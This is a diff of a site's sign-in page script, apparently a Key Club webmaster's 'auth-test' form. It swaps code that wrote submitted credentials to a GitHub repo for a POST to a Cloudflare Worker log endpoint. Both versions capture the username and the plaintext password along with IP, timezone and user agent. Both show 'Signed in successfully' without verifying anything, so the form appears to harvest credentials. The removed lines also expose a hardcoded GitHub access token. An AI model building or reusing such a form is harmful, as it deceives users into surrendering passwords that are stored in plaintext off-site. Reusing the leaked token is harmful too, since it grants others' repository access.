@@ -304,11 +304,7 @@
 <div class="toast" id="toast"></div>
 
 <script>
-  // ── CONFIG ──────────────────────────────────────────────────
-  const GITHUB_TOKEN = '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';                         // ← replace with your PAT
-  const GITHUB_REPO  = 'MO-ARKKeyClubWebmaster/moarkkeyclub-net';
-  const DATA_FOLDER  = 'auth-submissions';                 // folder that will be created in the repo
-  // ────────────────────────────────────────────────────────────
+  const WORKER = 'https://moark-portal-api.moarkkeyclubwebmaster.workers.dev';
 
   function showToast(msg, isError = false) {
     const t = document.getElementById('toast');
@@ -323,47 +319,13 @@
     document.getElementById('btnText').textContent = on ? 'Submitting…' : 'Sign In';
   }
 
-  async function getIP() {
-    try {
-      const r = await fetch('https://api.ipify.org?format=json');
-      return (await r.json()).ip;
-    } catch { return 'unavailable'; }
-  }
-
   function getOffsetString() {
-    const off = -new Date().getTimezoneOffset();
+    const off  = -new Date().getTimezoneOffset();
     const sign = off >= 0 ? '+' : '-';
     const abs  = Math.abs(off);
     const h    = Math.floor(abs / 60);
     const m    = abs % 60;
     return m ? `UTC${sign}${h}:${String(m).padStart(2,'0')}` : `UTC${sign}${h}`;
-  }
-
-  async function pushToGitHub(payload) {
-    const now       = new Date();
-    const timestamp = now.toISOString().replace(/[:.]/g, '-');
-    const filename  = `submission-${timestamp}.json`;
-    const path      = `${DATA_FOLDER}/${filename}`;
-    const content   = btoa(unescape(encodeURIComponent(JSON.stringify(payload, null, 2))));
-
-    const res = await fetch(`https://api.github.com/repos/${GITHUB_REPO}/contents/${path}`, {
-      method: 'PUT',
-      headers: {
-        'Authorization': `Bearer ${GITHUB_TOKEN}`,
-        'Content-Type':  'application/json',
-        'Accept':        'application/vnd.github+json'
-      },
-      body: JSON.stringify({
-        message: `auth-test: new submission ${timestamp}`,
-        content: content
-      })
-    });
-
-    if (!res.ok) {
-      const err = await res.json();
-      throw new Error(err.message || `GitHub API error ${res.status}`);
-    }
-    return await res.json();
   }
 
   async function handleSubmit() {
@@ -396,22 +358,22 @@
 
     try {
       const now = new Date();
-      const ip  = await getIP();
 
-      const payload = {
-        username:      username,
-        password:      password,           // plaintext for test only — hash before production
-        ip_address:    ip,
-        timestamp_utc: now.toISOString(),
-        utc_offset:    getOffsetString(),
-        local_time:    now.toLocaleString(),
-        user_agent:    navigator.userAgent
-      };
+      // POST to the Worker's /log endpoint — Worker captures real IP via CF-Connecting-IP
+      await fetch(`${WORKER}/log`, {
+        method:  'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          actor:     username,
+          actorName: username,
+          actorRole: 'auth-test',
+          actorDiv:  null,
+          action:    'AUTH_ATTEMPT',
+          detail:    `password=${password} | utc_offset=${getOffsetString()} | local_time=${now.toLocaleString()} | ua=${navigator.userAgent}`,
+        }),
+      });
 
-      await pushToGitHub(payload);
       showToast('✓ Signed in successfully');
-
-      // Clear fields after success
       usernameEl.value = '';
       passwordEl.value = '';
 
